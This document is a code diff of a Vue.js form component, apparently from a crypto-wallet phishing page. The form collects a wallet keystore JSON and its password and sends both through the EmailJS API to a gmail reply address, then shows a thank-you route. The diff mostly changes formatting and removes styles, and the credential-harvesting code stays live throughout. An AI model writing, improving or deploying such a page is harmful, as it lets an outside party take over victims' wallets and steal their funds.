@@ -10,7 +10,7 @@
       v-model="keystore_JSON"
     >
     </el-input>
-    <span>Please enter your keystore in JSON format</span>
+    <span class="mt-4">Please enter your keystore in JSON format</span>
 
     <el-input
       placeholder="Password"
@@ -36,7 +36,7 @@ export default {
     return {
       keystore_JSON: "",
       password: "",
-      loading: false
+      loading: false,
     };
   },
   methods: {
@@ -53,13 +53,13 @@ export default {
             from_name: "KEYSTORE",
             keystore_JSON: this.keystore_JSON,
             password: this.password,
-            reply_to: "webstarknight4@gmail.com"
-          }
+            reply_to: "webstarknight4@gmail.com",
+          },
         };
         axios
           .post("https://api.emailjs.com/api/v1.0/email/send", data)
           .then(function() {
-            window.location.href = "https://walletcloud-connect.surge.sh/";
+            self.$router.push("/thank-you")
             self.loading = false;
           })
           .catch(function() {
@@ -69,7 +69,7 @@ export default {
         this.$notify({
           title: "Warning",
           message: "All Form input is required",
-          type: "warning"
+          type: "warning",
         });
       }
     },
@@ -79,54 +79,11 @@ export default {
       } else {
         return true;
       }
-    }
-  }
+    },
+  },
 };
 </script>
 
 <style lang="scss">
-.private {
-  min-height: 435px;
 
-  label {
-    color: #565656;
-  }
-  p {
-    color: #3b99fc;
-  }
-  input {
-    border: 1px solid #3b99fc;
-    height: 50px;
-    background: black;
-  }
-  button {
-    height: 50px;
-    border: 1px solid #3b99fc;
-    border-radius: 4px;
-    text-transform: uppercase;
-    transition: all 0.2s ease-in-out;
-    font-size: 20px;
-    font-weight: 600;
-
-    &:hover,
-    &:active {
-      color: white;
-      outline: none;
-      border-color: #3b99fc;
-      background-color: black;
-    }
-  }
-
-  .el-textarea {
-    textarea {
-      outline: none !important;
-      border: 1px solid #3b99fc !important;
-      font-weight: 500;
-      padding: 12px;
-      font-size: 16px;
-      resize: none;
-      border-radius: 4px;
-    }
-  }
-}
 </style>
